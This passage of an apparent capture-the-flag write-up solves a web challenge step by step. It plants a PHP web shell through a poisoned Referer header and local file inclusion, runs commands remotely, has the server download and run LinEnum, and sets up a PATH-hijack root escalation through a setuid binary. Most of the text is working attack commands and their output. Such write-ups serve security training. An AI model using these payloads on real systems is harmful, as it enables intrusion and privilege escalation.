```
So instead of printing something, let's use PHP to create a shell.
What we want to do is upload the following PHP script to a writable location on the server:
```php
"; 
    $cmd = ($_REQUEST['cmd']); 
    _s_y_s_t_e_m($cmd); // Some Antivirus programs delete this writeup if it contains the command without underscores :-O
    echo ""; 
    die; 
}
?>
```
We'll encode this PHP script with base64 and upload it to a writable location on the server (`/tmp`):
```console
root@kali:/media/sf_CTFs/hoshen/3# curl http://13.67.133.176/test.php?file=foo --referer "- /tmp/shell'); ?>" 
```
We can then make requests to the script and they will be executed on the server:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST  --data-urlencode "cmd=ls -la"
total 36
drwxr-xr-x 5 root root 4096 Feb  8 13:46 .
drwxr-xr-x 3 root root 4096 Jan 22 08:00 ..
drwxr-xr-x 2 root root 4096 Feb  5 20:46 gallery
-rw-r--r-- 1 root root 1082 Feb  8 13:46 index.html
-rw-r--r-- 1 root root   19 Dec  5 08:59 index.php
drwxr-xr-x 5 root root 4096 Feb  8 01:07 pages
drwxr-xr-x 2 root root 4096 Jan 28 19:40 pics
-rw-r--r-- 1 root root  117 Dec  5 09:13 test.php
-rw-r--r-- 1 root root 3164 Feb  8 13:38 web.css
```
We can check the source of `test.php`:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=cat test.php"
```
We can run scripts:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=wget -O /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh " && echo
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=ls -la /tmp" && echo
total 60
drwxrwxrwt  2 root     root      4096 Feb 12 20:21 .
drwxr-xr-x 23 root     root      4096 Feb 11 06:45 ..
-rw-r--r--  1 www-data www-data 46631 Feb 12 20:21 LinEnum.sh
-rw-r--r--  1 www-data www-data   113 Feb 12 20:20 shell
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=chmod +x /tmp/LinEnum.sh" && echo
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=/tmp/LinEnum.sh > linout.txt" && echo
```
One of the sections of the `LinEnum` report is about `SetUID` files:
```
SUID files:
-rwsr-xr-x 1 root root 35600 Mar 29  2018 /sbin/mount.cifs
-rwsr-xr-x 1 root root 8432 Jan 22 11:28 /bin/files
-rwsr-xr-x 1 root root 26696 Aug 22 23:47 /bin/umount
-rwsr-xr-x 1 root root 43088 Aug 22 23:47 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 149080 Jan 31 17:18 /usr/bin/sudo
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 109432 Oct 30 12:17 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
```
These executable files are able to run with the permissions of the owner, as opposed to regular executable files which run with the permissions of the current user.
Most of the files are known and expected, but one of them stands out:
```
-rwsr-xr-x 1 root root 8432 Jan 22 11:28 /bin/files
```
What is this file?
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=ls -al /bin/files"
-rwsr-xr-x 1 root root 8432 Jan 22 11:28 /bin/files
```
If we try to run it, we get:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=/bin/files"
gallery
index.html
index.php
pages
pics
test.php
web.css
Welcome!
This is your files:
```
This doesn't feel like a real tool. Let's dump it and take a closer look:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=cat /bin/files | base64" 
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAEAYAAAAAAABAAAAAAAAAALAZAAAAAAAAAAAAAEAAOAAJ
AEAAHQAcAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCAAAAAAAAOAIAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgJAAAAAAAAWAkAAAAAAAAAACAA
AAAAAAEAAAAGAAAAoA0AAAAAAACgDSAAAAAAAKANIAAAAAAAcAIAAAAAAAB4AgAAAAAAAAAAIAAA
AAAAAgAAAAYAAACwDQAAAAAAALANIAAAAAAAsA0gAAAAAADwAQAAAAAAAPABAAAAAAAACAAAAAAA
AAAEAAAABAAAAFQCAAAAAAAAVAIAAAAAAABUAgAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
AFDldGQEAAAAFAgAAAAAAAAUCAAAAAAAABQIAAAAAAAAPAAAAAAAAAA8AAAAAAAAAAQAAAAAAAAA
```
We copy the file to our local host and decode it:
```console
root@kali:/media/sf_CTFs/hoshen/3# cat files_base64.txt | base64 -d > files.elf
root@kali:/media/sf_CTFs/hoshen/3# file files.elf
files.elf: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2f94b5fff5379820dbdff60ed3652d152cb908e1, not stripped
```
Opening it with Ghidra, we see the following simple implementation:
```c
undefined8 main(void)
{
  setuid(0);
  setgid(0);
  puts("Welcome!");
  puts("This is your files:");
  system("ls");
  return 1;
}
```
### Privilege Escalation
What `/bin/files` does is to basically set the effective user to `root` and to run `ls` (as root).
Naively, this prints the contents of the current working directory. But what if we can trick the program into executing a different `ls`, such as a script we choose to call `ls`? In that case, it will execute the script as root, running any commands we feed it. Let's do that.
First, we set up a working directory:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=mkdir /tmp/.w"
```
Then, we craft the script we want to run. Here it is: